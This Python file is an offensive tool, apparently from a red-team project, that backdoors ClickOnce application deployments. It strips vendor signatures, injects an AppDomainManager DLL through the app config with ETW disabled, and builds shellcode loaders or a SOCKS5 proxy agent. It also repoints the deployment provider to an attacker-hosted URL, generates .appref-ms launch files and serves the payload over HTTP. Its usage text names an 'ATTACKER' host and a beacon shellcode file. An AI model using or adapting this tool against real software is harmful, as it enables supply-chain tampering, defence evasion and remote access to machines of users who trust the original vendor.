#!/usr/bin/env python3
"""
ClickOnce AppDomainManager Injection Toolkit
=============================================

Usage:
    python clickonce_backdoor.py --input ./App.application --url http://ATTACKER --payload payload.dll
    python clickonce_backdoor.py --input ./App.application --url http://ATTACKER --poc
    python clickonce_backdoor.py --input ./App.application --url http://ATTACKER --proxyblob <base64-conn-string>
    python clickonce_backdoor.py serve --port 80 --dir ./output
"""
import argparse, base64, hashlib, os, re, shutil, subprocess, sys
from pathlib import Path

from semver import Version

BANNER = r"""
_________ .__  .__        __   ________                     __________.__        ___.  ___.                 
\_   ___ \|  | |__| ____ |  | _\_____  \   ____   ____  ____\______   \  |   ____\_ |__\_ |__   ___________ 
/    \  \/|  | |  |/ ___\|  |/ //   |   \ /    \_/ ___\/ __ \|    |  _/  |  /  _ \| __ \| __ \_/ __ \_  __ \
\     \___|  |_|  \  \___|    </    |    \   |  \  \__\  ___/|    |   \  |_(  <_> ) \_\ \ \_\ \  ___/|  | \/
 \______  /____/__|\___  >__|_ \_______  /___|  /\___  >___  >______  /____/\____/|___  /___  /\___  >__|   
        \/             \/     \/       \/     \/     \/    \/       \/                \/    \/     \/       

                  ClickOnce + AppDomainManager Injection + ProxyBlob Toolkit
                  github.com/dazzyddos/ClickOnceBlobber
"""

def sha256_base64(fp):
    h = hashlib.sha256()
    with open(fp,'rb') as f:
        for c in iter(lambda:f.read(8192),b''): h.update(c)
    return base64.b64encode(h.digest()).decode()

def file_size(fp): return os.path.getsize(fp)

def find_csc():
    """Locate csc.exe, preferring modern Roslyn compiler over .NET Framework 4.x.

    The .NET Framework 4.x csc.exe (v4.0.30319) only supports C# 5.
    Our templates use C# 6+ features (expression-bodied members, etc.),
    so we prefer the Roslyn-based compiler from Visual Studio or NuGet.
    """
    # 1. Visual Studio / Build Tools Roslyn installations
    for prog in [os.environ.get('ProgramFiles', r'C:\Program Files'),
                 os.environ.get('ProgramFiles(x86)', r'C:\Program Files (x86)')]:
        vs_root = Path(prog) / 'Microsoft Visual Studio'
        if vs_root.is_dir():
            matches = sorted(vs_root.glob('*/*/MSBuild/Current/Bin/Roslyn/csc.exe'), reverse=True)
            if matches: return matches[0]

    # 2. NuGet-installed Roslyn compiler (next to script)
    packages_dir = Path(__file__).parent / 'packages'
    for pattern in ['Microsoft.Net.Compilers.Toolset.*/tasks/net472/csc.exe',
                    'Microsoft.Net.Compilers.*/tools/csc.exe']:
        matches = sorted(packages_dir.glob(pattern), reverse=True)
        if matches: return matches[0]

    # 3. PATH (may be Roslyn or Framework — caller can check)
    found = shutil.which('csc')
    if found: return Path(found)

    # 4. .NET Framework csc.exe — C# 5 only, last resort
    windir = os.environ.get('SystemRoot', r'C:\Windows')
    for sub in [r'Microsoft.NET\Framework64\v4.0.30319', r'Microsoft.NET\Framework\v4.0.30319']:
        p = Path(windir) / sub / 'csc.exe'
        if p.exists(): return p
    return None

def find_nuget():
    """Locate nuget.exe next to this script or on PATH."""
    local = Path(__file__).parent / 'nuget.exe'
    if local.exists(): return local
    found = shutil.which('nuget')
    return Path(found) if found else None

def _run_cmd(cmd, description, cwd=None):
    """Run a command, raising RuntimeError with output on failure."""
    r = subprocess.run(cmd, capture_output=True, cwd=cwd)
    if r.returncode != 0:
        out = r.stdout.decode('utf-8', errors='replace')
        err = r.stderr.decode('utf-8', errors='replace')
        raise RuntimeError(f'{description} failed (exit {r.returncode}):\n{out}\n{err}')
    return r

def read_xml(fp):
    with open(fp,'r',encoding='utf-8-sig') as f: return f.read()

def write_xml(fp, txt):
    with open(fp,'w',encoding='utf-8',newline='\r\n') as f: f.write(txt)

# --- Raw XML text manipulation (preserves all original formatting/namespaces) ---

def xml_zero_pkt(t, vendor_token=None):
    """Zero publicKeyToken ONLY for the vendor's signing identity.
    
    ClickOnce manifests contain publicKeyToken in two contexts:
      1. The app/deployment identity (vendor's code-signing token) — MUST be zeroed
         after signature removal, or ClickOnce refuses to load.
      2. Third-party dependency references (e.g. Newtonsoft.Json with its own strong-name
         token) — MUST NOT be touched, or ClickOnce throws RefDefValidation because the
         manifest token no longer matches the actual DLL's embedded identity.
    
    If vendor_token is provided, only that specific token value gets zeroed.
    If vendor_token is None (legacy/fallback), zeros all tokens (old behavior).
    """
    if vendor_token and vendor_token != '0000000000000000':
        return t.replace(f'publicKeyToken="{vendor_token}"', 'publicKeyToken="0000000000000000"')
    elif vendor_token is None:
        # Fallback: only zero the FIRST assemblyIdentity (top-level identity element)
        # This is safer than blanket replace but still a heuristic
        return re.sub(r'publicKeyToken="[^"]*"', 'publicKeyToken="0000000000000000"', t)
    return t

def xml_get_vendor_token(t):
    """Extract the vendor's publicKeyToken from the top-level assemblyIdentity.
    
    In deployment manifests:  <asmv1:assemblyIdentity ... publicKeyToken="XXXX" />
    In app manifests:         <asmv1:assemblyIdentity ... publicKeyToken="XXXX" />
    
    This is always the FIRST assemblyIdentity in the document.
    """
    m = re.search(r'<(?:asmv1:)?assemblyIdentity\s[^>]*publicKeyToken="([^"]*)"', t)
    return m.group(1) if m else None

def xml_rm_sigs(t):
    """Remove all signature-related blocks from ClickOnce manifests.
    
    ClickOnce Authenticode signatures have a complex nested structure:
      <publisherIdentity ... />
      <Signature Id="StrongNameSignature" xmlns="...">
        <SignedInfo>...</SignedInfo>
        <SignatureValue>...</SignatureValue>
        <KeyInfo>
          <msrel:RelData>
            <r:license>
              <r:issuer>
                <Signature>...inner...</Signature>   <-- inner sig
              </r:issuer>
            </r:license>
          </msrel:RelData>
        </KeyInfo>
      </Signature>                                    <-- outer closing
    
    A naive <Signature.*?</Signature> regex matches inner-to-inner, leaving
    orphan </r:issuer></r:license></msrel:RelData></KeyInfo></Signature> tags.
    We must remove ALL of this.
    """
    # Remove <publisherIdentity ... /> (self-closing)
    t = re.sub(r'\s*<publisherIdentity[^/]*/>', '', t)
    # Remove <publisherIdentity ...>...</publisherIdentity>
    t = re.sub(r'\s*<publisherIdentity[^>]*>.*?</publisherIdentity>', '', t, flags=re.DOTALL)
    
    # Remove the ENTIRE Signature block including nested Authenticode structure
    # Strategy: match from <Signature all the way to the LAST </Signature> before </asmv1:assembly>
    # Use greedy .* to consume everything between first <Signature and last </Signature>
    t = re.sub(r'\s*<Signature\b.*</Signature>', '', t, flags=re.DOTALL)
    
    # Safety net: remove any orphan closing tags from the Authenticode wrapper
    # that might remain if the structure was unusual
    t = re.sub(r'\s*</r:issuer>\s*</r:license>\s*</msrel:RelData>\s*</KeyInfo>\s*</Signature>', '', t)
    
    # Clean up blank lines
    t = re.sub(r'\n\s*\n\s*\n', '\n', t)
    
    return t

def xml_update_file(t, name, sz, rm_hash=True):
    esc = re.escape(name)
    t = re.sub(rf'(<file\s+name="{esc}"\s+size=")\d+(")', rf'\g<1>{sz}\2', t)
    if rm_hash:
        t = re.sub(rf'(<file\s+name="{esc}"\s+size="\d+")\s*>\s*<hash>.*?</hash>\s*</file>',
                    r'\1 />', t, flags=re.DOTALL)
        t = re.sub(rf'(<file\s+name="{esc}"\s+size="\d+")\s*>\s*</file>',
                    r'\1 />', t, flags=re.DOTALL)
    return t

def xml_add_file(t, name, sz):
    entry = f'  <file name="{name}" size="{sz}" />\n'
    return t.replace('</asmv1:assembly>', f'{entry}</asmv1:assembly>')

def xml_file_exists(t, name):
    return bool(re.search(rf'<file\s+name="{re.escape(name)}"', t))

def xml_update_provider(t, url):
    return re.sub(r'(<deploymentProvider\s+codebase=")[^"]*(")',
                  lambda m: m.group(1) + url + m.group(2), t)

def xml_update_dep_size(t, sz):
    return re.sub(
        r'(<dependentAssembly\s+dependencyType="install"\s+codebase="[^"]*\.manifest"\s+size=")\d+(")',
        rf'\g<1>{sz}\2', t)

def xml_update_dep_hash(t, h):
    def _rep(m):
        b = m.group(0)
        return re.sub(r'(<dsig:DigestValue>)[^<]*(</dsig:DigestValue>)', rf'\g<1>{h}\2', b)
    return re.sub(
        r'<dependentAssembly\s+dependencyType="install"\s+codebase="[^"]*\.manifest"[^>]*>.*?</dependentAssembly>',
        _rep, t, flags=re.DOTALL)

def xml_get_exe(t):
    m = re.search(r'<commandLine\s+file="([^"]*)"', t)
    return m.group(1) if m else None

def xml_get_manifest_codebase(t):
    m = re.search(r'<dependentAssembly\s+dependencyType="install"\s+codebase="([^"]*\.manifest)"', t)
    return m.group(1) if m else None

def xml_has_mapext(t):
    return bool(re.search(r'mapFileExtensions="true"', t, re.I))

# --- Payload Templates (loaded from examples/ directory) ---

def _find_examples_dir():
    """Locate the examples/ directory relative to the script."""
    candidates = [
        Path(__file__).parent / 'examples',
        Path('./examples'),
    ]
    for p in candidates:
        if p.is_dir(): return p
    return None

def _load_template(name):
    """Load a .cs template from the examples/ directory."""
    d = _find_examples_dir()
    if not d: return None
    p = d / name
    return p.read_text(encoding='utf-8') if p.exists() else None

def load_poc_template():       return _load_template('MessageBoxPoC.cs')
def load_sc_template():        return _load_template('ShellcodeLoader.cs')
def load_proxyblob_template(): return _load_template('ProxyBlobAgent.cs')

CFG_TPL = '''<?xml version="1.0" encoding="utf-8"?>
<configuration>
{existing}  <runtime>
    <appDomainManagerAssembly
        value="{asm}, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType
        value="{cls}" />
    <etwEnable enabled="false" />
  </runtime>
</configuration>
'''

def parse_existing_cfg(path):
    if not os.path.exists(path): return ''
    with open(path,'r',encoding='utf-8-sig') as f: c = f.read()
    c = re.sub(r'<\?xml[^?]*\?>\s*','',c)
    c = re.sub(r'^\s*<configuration[^>]*>\s*','',c,flags=re.DOTALL)
    c = re.sub(r'\s*</configuration>\s*$','',c,flags=re.DOTALL)
    c = re.sub(r'\s*<runtime>.*?</runtime>\s*','\n',c,flags=re.DOTALL)
    lines = [f'  {l.strip()}' for l in c.strip().split('\n') if l.strip()]
    return '\n'.join(lines)+'\n' if lines else ''

# --- Main ---

class ClickOnceBackdoor:
    def __init__(self, input_path, url, output='./output', payload=None,
                 shellcode=None, poc=False, dll_name=None, class_name=None,
                 verbose=False, proxyblob=None, platform='x86', silent=False):
        self.input_path = Path(input_path).resolve()
        self.url = url.rstrip('/')
        self.output_dir = Path(output).resolve()
        self.payload_dll = Path(payload).resolve() if payload else None
        self.shellcode_path = Path(shellcode).resolve() if shellcode else None
        self.poc = poc
        self.proxyblob = proxyblob
        self._dn = dll_name; self._cn = class_name
        self.verbose = verbose
        self.platform = platform
        self.silent = silent
        self.deploy_path = self.app_path = self.app_dir = None
        self.exe_name = self.dll_name = self.class_name = None
        self.vendor_token = None
        self.work_dir = None

    def log(self, m, l='INFO'):
        if self.silent and l != 'ERROR': return
        c = {'INFO':'\033[94m[*]\033[0m','OK':'\033[92m[+]\033[0m',
             'WARN':'\033[93m[!]\033[0m','ERROR':'\033[91m[-]\033[0m',
             'DEBUG':'\033[90m[D]\033[0m'}
        print(f'{c.get(l,"[*]")} {m}')

    def dbg(self, m):
        if self.verbose: self.log(m,'DEBUG')

    def _ensure_nuget_packages(self, packages_dir):
        """Install BouncyCastle and ILMerge via NuGet if not already present."""
        needed = []
        if not (packages_dir / 'BouncyCastle.Cryptography.2.5.1').is_dir():
            needed.append(('BouncyCastle.Cryptography', '2.5.1'))
        if not (packages_dir / 'ILMerge.3.0.41').is_dir():
            needed.append(('ILMerge', '3.0.41'))
        if not needed:
            self.dbg('NuGet packages already present')
            return
        nuget = find_nuget()
        if not nuget:
            raise FileNotFoundError(
                'nuget.exe not found. Download from nuget.org and place next to script or add to PATH.')
        packages_dir.mkdir(parents=True, exist_ok=True)
        for pkg, ver in needed:
            self.log(f'  Installing {pkg} {ver}...')
            _run_cmd([str(nuget), 'install', pkg, '-Version', ver,
                      '-OutputDirectory', str(packages_dir)],
                     f'nuget install {pkg}')
            self.log(f'  Installed {pkg} {ver}','OK')

    def _ensure_roslyn_compiler(self, packages_dir):
        """Install Roslyn compiler via NuGet if only the old Framework csc.exe is available.

        The .NET Framework 4.x csc.exe (v4.0.30319) only supports C# 5.
        Our templates require C# 6+ (expression-bodied members, etc.).
        """
        csc = find_csc()
        if csc and 'v4.0.30319' not in str(csc):
            self.dbg(f'Roslyn csc.exe found: {csc}')
            return  # Already have a modern compiler
        # Check if NuGet Roslyn already installed
        for pattern in ['Microsoft.Net.Compilers.Toolset.*/tasks/net472/csc.exe',
                        'Microsoft.Net.Compilers.*/tools/csc.exe']:
            if list(packages_dir.glob(pattern)):
                return
        nuget = find_nuget()
        if not nuget:
            raise FileNotFoundError(
                'nuget.exe not found. Need nuget.exe to install Roslyn compiler. '
                'Download from nuget.org and place next to script or add to PATH.')
        packages_dir.mkdir(parents=True, exist_ok=True)
        self.log('  Framework csc.exe is C# 5 only — installing Roslyn compiler...','WARN')
        _run_cmd([str(nuget), 'install', 'Microsoft.Net.Compilers.Toolset',
                  '-OutputDirectory', str(packages_dir)],
                 'nuget install Microsoft.Net.Compilers.Toolset')
        self.log('  Installed Roslyn compiler','OK')

    def _compile_cs(self, cs_path, dll_path, references=None):
        """Compile a .cs file to a DLL using csc.exe."""
        packages_dir = Path(__file__).parent / 'packages'
        self._ensure_roslyn_compiler(packages_dir)
        csc = find_csc()
        if not csc:
            raise FileNotFoundError(
                'csc.exe not found. Ensure .NET Framework 4.x or Visual Studio is installed.')
        self.dbg(f'Using compiler: {csc}')
        cmd = [str(csc), '/t:library', f'/platform:{self.platform}',
               '/nologo', f'/out:{dll_path}']
        for ref in (references or []):
            cmd.append(f'/r:{ref}')
        cmd.append(str(cs_path))
        self.dbg(f'Compiling: {" ".join(cmd)}')
        _run_cmd(cmd, 'csc.exe compilation')
        self.log(f'  Compiled: {dll_path.name} ({file_size(dll_path):,} bytes)','OK')

    def _ilmerge(self, pre_dll, final_dll, merge_dlls, packages_dir):
        """Merge assemblies using ILMerge."""
        ilmerge = packages_dir / 'ILMerge.3.0.41' / 'tools' / 'net452' / 'ILMerge.exe'
        if not ilmerge.exists():
            raise FileNotFoundError(
                f'ILMerge.exe not found at {ilmerge}. Run with --verbose to debug.')
        cmd = [str(ilmerge), f'/out:{final_dll}', '/t:library',
               str(pre_dll)] + [str(d) for d in merge_dlls] + ['/targetplatform:v4']
        self.dbg(f'ILMerge: {" ".join(cmd)}')
        _run_cmd(cmd, 'ILMerge')
        self.log(f'  Merged: {final_dll.name} ({file_size(final_dll):,} bytes)','OK')

    def run(self):
        try:
            self.step1(); self.step2(); self.step3(); self.step4()
            self.step5(); self.step6(); self.step7(); self.step8()
            self.step9(); self.step10(); self.summary()
        except Exception as e:
            self.log(f'Fatal: {e}','ERROR')
            if self.verbose: import traceback; traceback.print_exc()
            sys.exit(1)

    def step1(self):
        self.log('Step 1: Discovering structure...')
        if self.input_path.is_file() and self.input_path.suffix=='.application':
            self.deploy_path = self.input_path; base = self.input_path.parent
        elif self.input_path.is_dir():
            fs = list(self.input_path.glob('*.application'))
            if not fs: raise FileNotFoundError('No .application file found')
            self.deploy_path = fs[0]; base = self.input_path
        else: raise FileNotFoundError(f'Not found: {self.input_path}')

        self.log(f'  Deployment manifest: {self.deploy_path.name}','OK')
        dtxt = read_xml(self.deploy_path)
        cb = xml_get_manifest_codebase(dtxt)
        if not cb: raise ValueError('No app manifest codebase found')
        self.app_path = base / cb.replace('\\',os.sep)
        if not self.app_path.exists(): raise FileNotFoundError(f'Not found: {self.app_path}')
        self.app_dir = self.app_path.parent
        self.log(f'  App manifest: {self.app_path.name}','OK')

        atxt = read_xml(self.app_path)
        self.exe_name = xml_get_exe(atxt) or self.app_path.name.replace('.manifest','')
        self.log(f'  Target EXE: {self.exe_name}','OK')

        # Extract vendor's publicKeyToken before we modify anything
        self.vendor_token = xml_get_vendor_token(dtxt)
        if self.vendor_token and self.vendor_token != '0000000000000000':
            self.log(f'  Vendor publicKeyToken: {self.vendor_token}','OK')
        else:
            self.vendor_token = None
            self.log(f'  No vendor publicKeyToken (unsigned)','OK')

        safe = re.sub(r'[^a-zA-Z0-9_]','',self.exe_name.replace('.exe','')) or 'App'
        self.dll_name = self._dn or f'{safe}Helper'
        self.class_name = self._cn or f'{safe}Manager'
        self.log(f'  DLL: {self.dll_name}.dll | Class: {self.class_name}','OK')
        self.use_deploy = xml_has_mapext(dtxt)

    def step2(self):
        self.log('Step 2: Preparing workspace...')
        self.work_dir = Path('./clickonce_workspace').resolve()
        if self.work_dir.exists(): shutil.rmtree(self.work_dir)
        base = self.deploy_path.parent
        shutil.copytree(str(base), str(self.work_dir))
        self.deploy_path = self.work_dir / self.deploy_path.name
        rel = self.app_dir.relative_to(base)
        self.app_dir = self.work_dir / rel
        self.app_path = self.app_dir / self.app_path.name
        self.log(f'  Workspace: {self.work_dir}','OK')

    def step3(self):
        if not self.use_deploy:
            self.log('Step 3: No .deploy extensions'); return
        self.log('Step 3: Stripping .deploy...')
        n=0
        for f in self.app_dir.rglob('*.deploy'):
            f.rename(f.with_suffix('')); n+=1
        self.log(f'  Stripped {n} files','OK')

    def step4(self):
        self.log('Step 4: Preparing payload...')
        dst = self.app_dir / f'{self.dll_name}.dll'
        if self.payload_dll and self.payload_dll.exists():
            shutil.copy2(str(self.payload_dll), str(dst))
            self.log(f'  Copied: {self.payload_dll.name} ({file_size(dst)} bytes)','OK')
        elif self.proxyblob:
            tpl = load_proxyblob_template()
            if not tpl:
                raise FileNotFoundError(
                    'examples/ProxyBlobAgent.cs not found. Ensure examples/ is next to this script.')
            cs_src = tpl.replace('{CLASSNAME}', self.class_name).replace('{CONNSTRING}', self.proxyblob)
            cs = self.app_dir / f'{self.dll_name}.cs'
            cs.write_text(cs_src, encoding='utf-8')
            self.log(f'  Generated ProxyBlob agent source: {cs.name}','OK')
            self.log(f'  Connection string: {self.proxyblob[:32]}...','OK')

            packages_dir = Path(__file__).parent / 'packages'
            self._ensure_nuget_packages(packages_dir)

            bc_dll = packages_dir / 'BouncyCastle.Cryptography.2.5.1' / 'lib' / 'netstandard2.0' / 'BouncyCastle.Cryptography.dll'
            pre_dll = self.app_dir / f'{self.dll_name}_pre.dll'
            self._compile_cs(cs, pre_dll, references=[
                str(bc_dll), 'System.Net.Http.dll', 'netstandard.dll'])
            self._ilmerge(pre_dll, dst, [bc_dll], packages_dir)

            pre_dll.unlink(missing_ok=True)
            cs.unlink(missing_ok=True)
        elif self.shellcode_path and self.shellcode_path.exists():
            tpl = load_sc_template()
            if not tpl:
                raise FileNotFoundError(
                    'examples/ShellcodeLoader.cs not found. Ensure examples/ is next to this script.')
            with open(self.shellcode_path,'rb') as f: sc = f.read()
            cs_src = tpl.replace('{CLASSNAME}', self.class_name).replace('{SHELLCODE}', base64.b64encode(sc).decode())
            cs = self.app_dir / f'{self.dll_name}.cs'
            cs.write_text(cs_src, encoding='utf-8')
            self.log(f'  Generated shellcode loader: {cs.name}','OK')
            self._compile_cs(cs, dst)
            cs.unlink(missing_ok=True)
        elif self.poc:
            tpl = load_poc_template()
            if not tpl:
                raise FileNotFoundError(
                    'examples/MessageBoxPoC.cs not found. Ensure examples/ is next to this script.')
            cs_src = tpl.replace('{CLASSNAME}', self.class_name)
            cs = self.app_dir / f'{self.dll_name}.cs'
            cs.write_text(cs_src, encoding='utf-8')
            self.log(f'  Generated PoC source: {cs.name}','OK')
            self._compile_cs(cs, dst)
            cs.unlink(missing_ok=True)
        else: raise ValueError('Need --payload, --shellcode, --poc, or --proxyblob')
        self.dll_path = dst

    def step5(self):
        self.log('Step 5: Modifying .exe.config...')
        cfgname = f'{self.exe_name}.config'
        cfgpath = self.app_dir / cfgname
        existing = parse_existing_cfg(cfgpath) if cfgpath.exists() else ''
        cfgpath.write_text(CFG_TPL.format(asm=self.dll_name,cls=self.class_name,existing=existing),
                          encoding='utf-8')
        self.cfg_path = cfgpath
        self.log(f'  Wrote: {cfgname} ({file_size(cfgpath)} bytes)','OK')

    def step6(self):
        self.log('Step 6: Updating app manifest (raw text)...')
        t = read_xml(self.app_path)
        t = xml_zero_pkt(t, self.vendor_token)
        t = xml_rm_sigs(t)
        self.log(f'  Cleaned signatures & zeroed vendor publicKeyToken','OK')

        cfgname = f'{self.exe_name}.config'
        csz = file_size(self.cfg_path)
        if xml_file_exists(t, cfgname):
            t = xml_update_file(t, cfgname, csz)
            self.log(f'  Updated: {cfgname} ({csz} bytes)','OK')
        else:
            t = xml_add_file(t, cfgname, csz)
            self.log(f'  Added: {cfgname} ({csz} bytes)','OK')

        dn = f'{self.dll_name}.dll'; dsz = file_size(self.dll_path)
        if xml_file_exists(t, dn):
            t = xml_update_file(t, dn, dsz)
            self.log(f'  Updated: {dn} ({dsz} bytes)','OK')
        else:
            t = xml_add_file(t, dn, dsz)
            self.log(f'  Added: {dn} ({dsz} bytes)','OK')

        write_xml(self.app_path, t)
        self.log(f'  Saved ({file_size(self.app_path)} bytes)','OK')

    def step7(self):
        self.log('Step 7: Updating deployment manifest (raw text)...')
        t = read_xml(self.deploy_path)
        t = xml_zero_pkt(t, self.vendor_token)
        t = xml_rm_sigs(t)
        self.log(f'  Cleaned signatures & zeroed vendor publicKeyToken','OK')

        purl = f'{self.url}/{self.deploy_path.name}'
        t = xml_update_provider(t, purl)
        self.log(f'  Provider: {purl}','OK')

        msz = file_size(self.app_path)
        mhash = sha256_base64(self.app_path)
        t = xml_update_dep_size(t, msz)
        t = xml_update_dep_hash(t, mhash)
        self.log(f'  Manifest ref: size={msz} hash={mhash[:32]}...','OK')

        write_xml(self.deploy_path, t)
        self.log(f'  Saved ({file_size(self.deploy_path)} bytes)','OK')

    def step8(self):
        if not self.use_deploy:
            self.log('Step 8: No .deploy needed'); return
        self.log('Step 8: Applying .deploy...')
        n=0
        for f in self.app_dir.rglob('*'):
            if f.is_dir(): continue
            if f.suffix in ['.manifest','.application','.deploy','.cs','.py','.txt','.md']: continue
            f.rename(f.parent/(f.name+'.deploy')); n+=1
        self.log(f'  Applied to {n} files','OK')

    def step9(self):
        self.log('Step 9: Building output...')
        if self.output_dir.exists(): shutil.rmtree(self.output_dir)
        shutil.copytree(str(self.work_dir), str(self.output_dir))
        self.log(f'  Output: {self.output_dir}','OK')
        for f in sorted(self.output_dir.rglob('*')):
            if f.is_file():
                self.log(f'    {f.relative_to(self.output_dir)} ({file_size(f):,} bytes)')

    def step10(self):
        self.log('Step 10: Generating .appref-ms...')
        an = self.deploy_path.name
        c = f'{self.url}/{an}#{an}, Culture=neutral, PublicKeyToken=0000000000000000, processorArchitecture=x86'
        p = self.output_dir / an.replace('.application','.appref-ms')
        with open(p,'wb') as f:
            f.write(b'\xff\xfe')
            f.write(c.encode('utf-16-le'))
        self.log(f'  Generated: {p.name}','OK')

    def summary(self):
        an = self.deploy_path.name
        print(f"\n{'='*65}")
        print(f"  BACKDOORING COMPLETE")
        print(f"{'='*65}")

        print(f"\n  Output:    {self.output_dir}")
        print(f"  URL:       {self.url}/{an}")
        print(f"  DLL:       {self.dll_name}.dll")
        print(f"  Class:     {self.class_name}")
        print(f"  Platform:  {self.platform}")
        if self.proxyblob:
            print(f"  Payload:   ProxyBlob SOCKS5 agent")
            print(f"  ConnStr:   {self.proxyblob[:40]}...")
        elif self.poc:
            print(f"  Payload:   MessageBox PoC")
        elif self.shellcode_path:
            print(f"  Payload:   Shellcode loader")

        print(f"\n  Serve:  python {sys.argv[0]} serve --port 80 --dir {self.output_dir}")
        print(f"\n  Cache:  rundll32 dfshim CleanOnlineAppCache\n")

def serve(d, port=80, bind='0.0.0.0'):
    import http.server, socketserver
    os.chdir(d)
    h = http.server.SimpleHTTPRequestHandler
    h.extensions_map.update({'.application':'application/x-ms-application',
        '.manifest':'application/x-ms-manifest','.deploy':'application/octet-stream'})
    print(f'  [*] Serving {d} on {bind}:{port}\n')
    with socketserver.TCPServer((bind,port),h) as s:
        try: s.serve_forever()
        except KeyboardInterrupt: print('\n[*] Stopped.')

# --- CLI ---

_B = '\033[1m'; _G = '\033[92m'; _C = '\033[96m'; _Y = '\033[93m'
_D = '\033[90m'; _RE = '\033[91m'; _R = '\033[0m'

USAGE_TEXT = f"""\
{_B}Usage:{_R}

  {_G}Pre-compiled DLL payload:{_R}
    python clickonce_backdoor.py {_C}--input{_R} {_Y}./App.application{_R} {_C}--url{_R} {_Y}http://ATTACKER{_R} {_C}--payload{_R} {_Y}payload.dll{_R}

  {_G}PoC - MessageBox (validates injection):{_R}
    python clickonce_backdoor.py {_C}--input{_R} {_Y}./App.application{_R} {_C}--url{_R} {_Y}http://ATTACKER{_R} {_C}--poc{_R}

  {_G}ProxyBlob SOCKS5 agent:{_R}
    python clickonce_backdoor.py {_C}--input{_R} {_Y}./App.application{_R} {_C}--url{_R} {_Y}http://ATTACKER{_R} {_C}--proxyblob{_R} {_Y}<base64-conn-string>{_R}

  {_G}Shellcode loader:{_R}
    python clickonce_backdoor.py {_C}--input{_R} {_Y}./App.application{_R} {_C}--url{_R} {_Y}http://ATTACKER{_R} {_C}--shellcode{_R} {_Y}beacon.bin{_R}

  {_G}Serve output directory:{_R}
    python clickonce_backdoor.py {_G}serve{_R} {_C}--port{_R} {_Y}80{_R} {_C}--dir{_R} {_Y}./output{_R}
"""

class _CliParser(argparse.ArgumentParser):
    """ArgumentParser with colored usage examples."""

    def format_help(self):
        formatter = self._get_formatter()
        for ag in self._action_groups:
            formatter.start_section(ag.title)
            formatter.add_arguments(ag._group_actions)
            formatter.end_section()
        return USAGE_TEXT + '\n' + formatter.format_help()

    def error(self, message):
        sys.stderr.write(USAGE_TEXT + '\n')
        sys.stderr.write(f'  {_RE}error:{_R} {message}\n\n')
        sys.exit(2)

def main():
    print(BANNER, flush=True)
    p = _CliParser()
    sp = p.add_subparsers(dest='cmd', help=argparse.SUPPRESS)
    sv = sp.add_parser('serve')
    sv.add_argument('--port','-p',type=int,default=80)
    sv.add_argument('--dir','-d',default='./output')
    sv.add_argument('--bind','-b',default='0.0.0.0')
    p.add_argument('--input','-i',help='.application file or directory')
    p.add_argument('--url','-u',help='Hosting URL')
    p.add_argument('--output','-o',default='./output')
    p.add_argument('--payload',help='Compiled payload DLL',dest='payload_path')
    p.add_argument('--shellcode','-s',help='Raw shellcode file')
    p.add_argument('--poc',action='store_true')
    p.add_argument('--proxyblob',help='ProxyBlob connection string (base64)')
    p.add_argument('--dll-name',default=None)
    p.add_argument('--class-name',default=None)
    p.add_argument('--platform',choices=['x86','x64','anycpu'],default='x86',
                    help='Compiler platform target (default: x86)')
    p.add_argument('--silent','-q',action='store_true',
                    help='Suppress step output, show only banner and summary')
    p.add_argument('--verbose','-v',action='store_true')
    a = p.parse_args()

    if a.cmd == 'serve': serve(a.dir,a.port,a.bind); return
    if not a.input or not a.url: p.error('--input and --url required')
    if not a.payload_path and not a.shellcode and not a.poc and not a.proxyblob:
        p.error('Need --payload, --shellcode, --poc, or --proxyblob')

    ClickOnceBackdoor(a.input, a.url, a.output, a.payload_path, a.shellcode,
                      a.poc, a.dll_name, a.class_name, a.verbose, a.proxyblob,
                      a.platform, a.silent).run()

if __name__=='__main__': main()
